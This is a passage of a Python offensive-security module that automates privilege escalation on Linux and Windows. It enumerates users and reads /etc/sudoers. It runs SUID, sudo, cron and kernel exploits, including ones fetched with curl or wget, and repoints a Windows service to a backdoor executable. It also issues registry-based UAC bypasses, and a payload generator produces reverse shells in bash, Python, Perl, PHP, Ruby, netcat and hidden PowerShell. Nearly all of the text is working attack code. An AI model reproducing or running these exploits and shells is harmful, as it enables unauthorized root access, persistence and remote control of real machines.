            cmd = "ip route show 2>/dev/null || route -n 2>/dev/null"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                network_info['routes'] = result.stdout.strip()
            
            # Get open ports
            cmd = "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                network_info['ports'] = result.stdout.strip()
        
        except Exception as e:
            logger.debug(f"Network info error: {e}", module="privilege_escalation")
        
        return network_info
    
    def _get_user_info(self) -> Dict[str, Any]:
        """Get user information"""
        user_info = {}
        
        try:
            # Get current user info
            user_info['current'] = {
                'name': self.system_info.current_user,
                'uid': os.getuid() if hasattr(os, 'getuid') else None,
                'gid': os.getgid() if hasattr(os, 'getgid') else None,
                'home': os.environ.get('HOME', os.environ.get('USERPROFILE', ''))
            }
            
            # Get all users (Unix)
            if self.system_info.platform != 'Windows':
                try:
                    import pwd
                    users = []
                    for p in pwd.getpwall():
                        users.append({
                            'name': p.pw_name,
                            'uid': p.pw_uid,
                            'gid': p.pw_gid,
                            'home': p.pw_dir,
                            'shell': p.pw_shell
                        })
                    user_info['all_users'] = users
                except:
                    pass
            
            # Get sudoers
            if self.system_info.platform != 'Windows':
                try:
                    with open('/etc/sudoers', 'r') as f:
                        sudoers_content = f.read()
                    user_info['sudoers'] = sudoers_content
                except:
                    user_info['sudoers'] = 'Not accessible'
        
        except Exception as e:
            logger.debug(f"User info error: {e}", module="privilege_escalation")
        
        return user_info
    
    def attempt_escalation(self, method: EscalationMethod, 
                          custom_command: str = None) -> EscalationAttempt:
        """Attempt privilege escalation using specified method"""
        start_time = time.time()
        
        attempt = EscalationAttempt(
            method=method,
            result=EscalationResult.FAILED,
            command=None,
            output=None,
            error=None,
            execution_time=0.0,
            privilege_level=None
        )
        
        try:
            self.stats['attempts_made'] += 1
            self.stats['methods_tried'].add(method.value)
            
            # Check if already privileged
            if self.system_info.is_root or self.system_info.is_admin:
                attempt.result = EscalationResult.NOT_APPLICABLE
                attempt.output = "Already running with highest privileges"
                return attempt
            
            # Execute based on method
            if method == EscalationMethod.SUID_BINARY:
                success, output, error = self._exploit_suid_binaries()
                attempt.command = "SUID binary exploitation"
            
            elif method == EscalationMethod.SUDO_MISCONFIG:
                success, output, error = self._exploit_sudo_misconfig()
                attempt.command = "Sudo misconfiguration exploitation"
            
            elif method == EscalationMethod.CAPABILITIES:
                success, output, error = self._exploit_capabilities()
                attempt.command = "Linux capabilities exploitation"
            
            elif method == EscalationMethod.CRONTAB:
                success, output, error = self._exploit_crontab()
                attempt.command = "Crontab exploitation"
            
            elif method == EscalationMethod.KERNEL_EXPLOIT:
                success, output, error = self._exploit_kernel()
                attempt.command = "Kernel exploit execution"
            
            elif method == EscalationMethod.WINDOWS_SERVICE:
                success, output, error = self._exploit_windows_service()
                attempt.command = "Windows service exploitation"
            
            elif method == EscalationMethod.UAC_BYPASS:
                success, output, error = self._bypass_uac()
                attempt.command = "UAC bypass"
            
            elif method == EscalationMethod.CUSTOM and custom_command:
                success, output, error = self._execute_custom_command(custom_command)
                attempt.command = custom_command
            
            else:
                attempt.result = EscalationResult.NOT_APPLICABLE
                attempt.output = f"Method {method.value} not implemented for this platform"
                return attempt
            
            # Update attempt result
            attempt.output = output
            attempt.error = error
            attempt.execution_time = time.time() - start_time
            
            if success:
                attempt.result = EscalationResult.SUCCESS
                self.stats['successful_escalations'] += 1
                
                # Check new privilege level
                if self.system_info.platform != 'Windows':
                    attempt.privilege_level = 'root' if os.geteuid() == 0 else 'user'
                else:
                    attempt.privilege_level = 'admin' if self.system_info.is_admin else 'user'
            else:
                attempt.result = EscalationResult.FAILED
                self.stats['failed_attempts'] += 1
            
            # Log audit event
            audit_log.log_event(
                event_type=AuditEventType.PRIVILEGE_ESCALATION.value,
                severity=AuditSeverity.CRITICAL.value if success else AuditSeverity.HIGH.value,
                user=self.system_info.current_user,
                source_ip='localhost',
                description=f"Privilege escalation attempt: {method.value}",
                details={
                    'method': method.value,
                    'success': success,
                    'command': attempt.command,
                    'output': output[:500] if output else None,
                    'error': error[:500] if error else None,
                    'execution_time': attempt.execution_time,
                    'timestamp': datetime.now().isoformat()
                },
                resource='privilege_escalation',
                action='attempt_escalation'
            )
            
        except Exception as e:
            attempt.error = str(e)
            attempt.execution_time = time.time() - start_time
            logger.error(f"Escalation attempt error: {e}", module="privilege_escalation")
        
        # Add to history
        self.attempt_history.append(attempt)
        
        return attempt
    
    def _exploit_suid_binaries(self) -> Tuple[bool, str, str]:
        """Exploit SUID binaries"""
        try:
            # Find SUID binaries
            suid_binaries = self._find_suid_binaries()
            
            if not suid_binaries:
                return False, "No SUID binaries found", ""
            
            # Try to exploit each binary
            for binary in suid_binaries:
                if binary.get('exploit_suggested'):
                    exploit = binary['exploit_suggested']
                    
                    # Execute exploit
                    result = subprocess.run(exploit, shell=True, 
                                          capture_output=True, text=True, timeout=10)
                    
                    if result.returncode == 0:
                        # Check if we got root
                        if self.system_info.platform != 'Windows' and os.geteuid() == 0:
                            return True, f"Exploited {binary['path']}: {result.stdout}", result.stderr
            
            return False, "SUID exploitation failed", "No working exploit found"
            
        except Exception as e:
            return False, "", str(e)
    
    def _exploit_sudo_misconfig(self) -> Tuple[bool, str, str]:
        """Exploit sudo misconfigurations"""
        try:
            # Check sudo permissions
            sudo_commands = self._check_sudo_permissions()
            
            if not sudo_commands:
                return False, "No sudo permissions found", ""
            
            # Try to exploit each sudo command
            for sudo_cmd in sudo_commands:
                if sudo_cmd.get('exploit_suggestion'):
                    exploit = sudo_cmd['exploit_suggestion']
                    
                    # Execute exploit
                    result = subprocess.run(exploit, shell=True, 
                                          capture_output=True, text=True, timeout=10)
                    
                    if result.returncode == 0:
                        # Check if we got root
                        if self.system_info.platform != 'Windows' and os.geteuid() == 0:
                            return True, f"Exploited sudo: {result.stdout}", result.stderr
            
            return False, "Sudo exploitation failed", "No working exploit found"
            
        except Exception as e:
            return False, "", str(e)
    
    def _exploit_capabilities(self) -> Tuple[bool, str, str]:
        """Exploit Linux capabilities"""
        try:
            # Find capabilities
            capabilities = self._find_capabilities()
            
            if not capabilities:
                return False, "No capabilities found", ""
            
            # Try to exploit each capability
            for cap in capabilities:
                if cap.get('exploit_suggestion'):
                    exploit = cap['exploit_suggestion']
                    
                    # Execute exploit
                    result = subprocess.run(exploit, shell=True, 
                                          capture_output=True, text=True, timeout=10)
                    
                    if result.returncode == 0:
                        # Check if we got root
                        if os.geteuid() == 0:
                            return True, f"Exploited capabilities: {result.stdout}", result.stderr
            
            return False, "Capabilities exploitation failed", "No working exploit found"
            
        except Exception as e:
            return False, "", str(e)
    
    def _exploit_crontab(self) -> Tuple[bool, str, str]:
        """Exploit crontab entries"""
        try:
            # Find cron jobs
            cron_jobs = self._find_cron_jobs()
            
            if not cron_jobs:
                return False, "No cron jobs found", ""
            
            # Try to exploit each cron job
            for cron in cron_jobs:
                if cron.get('exploit_suggestion'):
                    exploit = cron['exploit_suggestion']
                    
                    # Replace placeholder
                    exploit = exploit.replace('ATTACKER_IP', '127.0.0.1')
                    
                    # Execute exploit
                    result = subprocess.run(exploit, shell=True, 
                                          capture_output=True, text=True, timeout=10)
                    
                    if result.returncode == 0:
                        return True, f"Cron exploit planted: {result.stdout}", result.stderr
            
            return False, "Crontab exploitation failed", "No working exploit found"
            
        except Exception as e:
            return False, "", str(e)
    
    def _exploit_kernel(self) -> Tuple[bool, str, str]:
        """Exploit kernel vulnerabilities"""
        try:
            # Check kernel vulnerabilities
            vulnerabilities = self._check_kernel_vulnerabilities()
            
            if not vulnerabilities:
                return False, "No kernel vulnerabilities found", ""
            
            # Try each exploit
            for vuln in vulnerabilities:
                if vuln.get('exploit_command'):
                    exploit = vuln['exploit_command']
                    
                    # Download and compile exploit if needed
                    if 'curl' in exploit or 'wget' in exploit:
                        # Execute the exploit command
                        result = subprocess.run(exploit, shell=True, 
                                              capture_output=True, text=True, timeout=60)
                        
                        if result.returncode == 0:
                            # Check if we got root
                            if os.geteuid() == 0:
                                return True, f"Kernel exploit successful: {result.stdout}", result.stderr
            
            return False, "Kernel exploitation failed", "No working exploit found"
            
        except Exception as e:
            return False, "", str(e)
    
    def _exploit_windows_service(self) -> Tuple[bool, str, str]:
        """Exploit Windows services"""
        try:
            if self.system_info.platform != 'Windows':
                return False, "Not a Windows system", ""
            
            # Check for vulnerable services
            services = self._enumerate_services()
            
            vulnerable_services = [s for s in services if s.get('exploitable')]
            
            if not vulnerable_services:
                return False, "No vulnerable services found", ""
            
            # Try service exploitation
            for service in vulnerable_services[:3]:  # Limit attempts
                service_name = service['name']
                
                # Attempt to modify service binary path
                exploit_cmd = f'sc config {service_name} binPath= "C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\Temp\\backdoor.exe"'
                
                result = subprocess.run(exploit_cmd, shell=True, 
                                      capture_output=True, text=True, timeout=10)
                
                if result.returncode == 0:
                    # Try to start service
                    start_cmd = f'sc start {service_name}'
                    result2 = subprocess.run(start_cmd, shell=True, 
                                           capture_output=True, text=True, timeout=10)
                    
                    if result2.returncode == 0:
                        return True, f"Service {service_name} exploited", result2.stdout
            
            return False, "Windows service exploitation failed", "No working exploit found"
            
        except Exception as e:
            return False, "", str(e)
    
    def _bypass_uac(self) -> Tuple[bool, str, str]:
        """Bypass Windows UAC"""
        try:
            if self.system_info.platform != 'Windows':
                return False, "Not a Windows system", ""
            
            if self.system_info.is_admin:
                return False, "Already running as administrator", ""
            
            # Common UAC bypass methods
            bypass_methods = [
                # FodHelper bypass
                'reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /d "cmd.exe" /f && reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /v "DelegateExecute" /f && fodhelper.exe',
                
                # Event Viewer bypass
                'reg add "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" /d "cmd.exe" /f && eventvwr.exe',
                
                # ComputerDefaults bypass
                'reg add "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" /d "cmd.exe" /f && computerdefaults.exe'
            ]
            
            for method in bypass_methods:
                result = subprocess.run(method, shell=True, 
                                      capture_output=True, text=True, timeout=30)
                
                if result.returncode == 0:
                    # Check if we got admin
                    try:
                        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                        if is_admin:
                            return True, f"UAC bypass successful: {result.stdout}", result.stderr
                    except:
                        pass
            
            return False, "UAC bypass failed", "All methods failed"
            
        except Exception as e:
            return False, "", str(e)
    
    def _execute_custom_command(self, command: str) -> Tuple[bool, str, str]:
        """Execute custom escalation command"""
        try:
            result = subprocess.run(command, shell=True, 
                                  capture_output=True, text=True, timeout=self.timeout)
            
            success = result.returncode == 0
            
            # Check privilege escalation
            if success and self.system_info.platform != 'Windows':
                success = os.geteuid() == 0
            elif success and self.system_info.platform == 'Windows':
                try:
                    success = ctypes.windll.shell32.IsUserAnAdmin() != 0
                except:
                    success = False
            
            return success, result.stdout, result.stderr
            
        except Exception as e:
            return False, "", str(e)
    
    def auto_escalate(self, max_attempts: int = None) -> List[EscalationAttempt]:
        """Automatically try multiple escalation methods"""
        if max_attempts is None:
            max_attempts = self.max_attempts
        
        attempts = []
        successful = False
        
        # Determine platform-specific methods to try
        methods_to_try = []
        
        if self.system_info.platform == 'Linux':
            methods_to_try = [
                EscalationMethod.SUDO_MISCONFIG,
                EscalationMethod.SUID_BINARY,
                EscalationMethod.CAPABILITIES,
                EscalationMethod.CRONTAB,
                EscalationMethod.KERNEL_EXPLOIT
            ]
        elif self.system_info.platform == 'Windows':
            methods_to_try = [
                EscalationMethod.UAC_BYPASS,
                EscalationMethod.WINDOWS_SERVICE,
                EscalationMethod.TOKEN_IMPERSONATION
            ]
        else:
            methods_to_try = [
                EscalationMethod.SUDO_MISCONFIG,
                EscalationMethod.SUID_BINARY,
                EscalationMethod.CRONTAB
            ]
        
        # Try each method until success or max attempts
        for method in methods_to_try:
            if len(attempts) >= max_attempts:
                break
            
            if successful and not self.aggressive_mode:
                break
            
            attempt = self.attempt_escalation(method)
            attempts.append(attempt)
            
            if attempt.result == EscalationResult.SUCCESS:
                successful = True
                
                if not self.aggressive_mode:
                    break
        
        return attempts
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get privilege escalation statistics"""
        uptime = (datetime.now() - self.stats['start_time']).total_seconds()
        
        # Calculate success rate
        total_attempts = self.stats['attempts_made']
        successful = self.stats['successful_escalations']
        success_rate = (successful / total_attempts * 100) if total_attempts > 0 else 0
        
        return {
            **self.stats,
            'uptime_seconds': uptime,
            'uptime_human': str(datetime.utcfromtimestamp(uptime).strftime('%H:%M:%S')),
            'success_rate': f"{success_rate:.1f}%",
            'current_privileges': self.check_current_privileges(),
            'system_info': self.system_info.to_dict(),
            'attempt_history_count': len(self.attempt_history),
            'methods_tried_count': len(self.stats['methods_tried']),
            'aggressive_mode': self.aggressive_mode,
            'stealth_mode': self.stealth_mode,
            'max_attempts': self.max_attempts,
            'timeout': self.timeout
        }
    
    def export_results(self, format: str = 'json', output_file: str = None) -> Optional[str]:
        """Export escalation results"""
        try:
            data = {
                'system_info': self.system_info.to_dict(),
                'current_privileges': self.check_current_privileges(),
                'enumeration': self.enumerate_system(),
                'statistics': self.get_statistics(),
                'attempt_history': [a.to_dict() for a in self.attempt_history],
                'timestamp': datetime.now().isoformat()
            }
            
            if format.lower() == 'json':
                output = json.dumps(data, indent=2)
            
            elif format.lower() == 'text':
                output_lines = []
                output_lines.append("PRIVILEGE ESCALATION REPORT")
                output_lines.append("=" * 80)
                output_lines.append(f"Platform: {self.system_info.platform}")
                output_lines.append(f"User: {self.system_info.current_user}")
                output_lines.append(f"Is Admin/Root: {self.system_info.is_admin or self.system_info.is_root}")
                output_lines.append(f"Attempts: {self.stats['attempts_made']}")
                output_lines.append(f"Successful: {self.stats['successful_escalations']}")
                output_lines.append(f"Success Rate: {(self.stats['successful_escalations']/self.stats['attempts_made']*100):.1f}%" if self.stats['attempts_made'] > 0 else "N/A")
                output_lines.append("")
                output_lines.append("ATTEMPT HISTORY:")
                output_lines.append("-" * 40)
                
                for i, attempt in enumerate(self.attempt_history):
                    output_lines.append(f"{i+1}. {attempt.method.value}: {attempt.result.value}")
                    if attempt.command:
                        output_lines.append(f"   Command: {attempt.command[:50]}...")
                    if attempt.output:
                        output_lines.append(f"   Output: {attempt.output[:50]}...")
                    output_lines.append("")
                
                output = '\n'.join(output_lines)
            
            else:
                logger.error(f"Unsupported format: {format}", module="privilege_escalation")
                return None
            
            # Write to file if specified
            if output_file:
                with open(output_file, 'w') as f:
                    f.write(output)
                
                logger.info(f"Results exported to {output_file}", module="privilege_escalation")
            
            return output
            
        except Exception as e:
            logger.error(f"Export results error: {e}", module="privilege_escalation")
            return None

class PayloadGenerator:
    """Generate payloads for privilege escalation"""
    
    def __init__(self):
        self.payloads = {}
    
    def generate_reverse_shell(self, lhost: str, lport: int, 
                              platform: str = None) -> Dict[str, str]:
        """Generate reverse shell payloads"""
        payloads = {}
        
        # Bash
        payloads['bash'] = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
        
        # Python
        payloads['python'] = f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''
        
        # Perl
        payloads['perl'] = f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''
        
        # PHP
        payloads['php'] = f'''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -&3 >&3 2>&3");' '''
        
        # Ruby
        payloads['ruby'] = f'''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''
        
        # Netcat
        payloads['netcat'] = f'nc -e /bin/sh {lhost} {lport}'
        
        # PowerShell (Windows)
        payloads['powershell'] = f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {{$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()}}" '''
        
        return payloads
    
    def generate_privesc_payload(self, method: str, **kwargs) -> Optional[str]:
        """Generate privilege escalation payload"""
        if method == 'suid_bash':
            return 'bash -p'
        
        elif method == 'sudo_bash':
            return 'sudo bash'
        
        elif method == 'python_privesc':
            return 'python -c "import os; os.setuid(0); os.system(\'/bin/bash\')"'
        
        elif method == 'capabilities':
            binary = kwargs.get('binary', '/usr/bin/python3')
            return f'{binary} -c "import os; os.setuid(0); os.system(\'/bin/bash\')"'
        
        elif method == 'cron_exploit':
            filepath = kwargs.get('filepath', '/tmp/exploit.sh')
            lhost = kwargs.get('lhost', '127.0.0.1')
            lport = kwargs.get('lport', 4444)
            
            return f'''echo '#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' > {filepath} && chmod +x {filepath}'''
        
        return None

# Global instance
_privilege_escalation = None

def get_privilege_escalation(config: Dict = None) -> PrivilegeEscalation:
    """Get or create privilege escalation instance"""
    global _privilege_escalation
    
    if _privilege_escalation is None:
        _privilege_escalation = PrivilegeEscalation(config)
    
    return _privilege_escalation

if __name__ == "__main__":
    print("Testing Privilege Escalation...")
    
    # Test configuration
    config = {
        'aggressive_mode': False,
        'stealth_mode': True,
        'max_attempts': 5,
        'timeout': 30,
        'payload_dir': '/tmp'
    }
    
    pe = get_privilege_escalation(config)
    
    print("\n1. System Information:")
    sys_info = pe.system_info
    print(f"Platform: {sys_info.platform}")
    print(f"Architecture: {sys_info.architecture}")
    print(f"Kernel: {sys_info.kernel_version}")
    print(f"User: {sys_info.current_user}")
    print(f"Is Root/Admin: {sys_info.is_root or sys_info.is_admin}")
    
    print("\n2. Current Privileges:")
    privs = pe.check_current_privileges()
    print(f"User: {privs['current_user']}")
    print(f"Is Admin: {privs['is_admin']}")
    print(f"Is Root: {privs['is_root']}")
    
    print("\n3. System Enumeration:")
    enum = pe.enumerate_system()
    print(f"SUID Binaries: {len(enum['suid_binaries'])}")
    print(f"Sudo Commands: {len(enum['sudo_commands'])}")
    print(f"Cron Jobs: {len(enum['cron_jobs'])}")
    print(f"Writable Files: {len(enum['writable_files'])}")
    print(f"Capabilities: {len(enum['capabilities'])}")
    
    print("\n4. Testing Auto-Escalation (limited)...")
    
    # Only test if not already privileged
    if not (sys_info.is_root or sys_info.is_admin):
        attempts = pe.auto_escalate(max_attempts=2)
        
        print(f"Attempts made: {len(attempts)}")
        
        for i, attempt in enumerate(attempts):
            print(f"  {i+1}. {attempt.method.value}: {attempt.result.value}")
            if attempt.output:
                print(f"     Output: {attempt.output[:50]}...")
    else:
        print("Already running with highest privileges, skipping escalation tests")
    
    print("\n5. Statistics:")
    stats = pe.get_statistics()
    print(f"Total Attempts: {stats['attempts_made']}")
    print(f"Successful: {stats['successful_escalations']}")
    print(f"Failed: {stats['failed_attempts']}")
    
    print("\n6. Testing Payload Generator...")
    pg = PayloadGenerator()
    payloads = pg.generate_reverse_shell('127.0.0.1', 4444)
    
    print(f"Generated {len(payloads)} reverse shell payloads")
    for lang, payload in list(payloads.items())[:3]:
        print(f"  {lang}: {payload[:50]}...")
    
    print("\n✅ Privilege Escalation tests completed!")
    
    # Export results
    print("\n7. Exporting results...")
    export_data = pe.export_results('text')
    if export_data:
        print(export_data[:500] + "..." if len(export_data)500 else export_data)
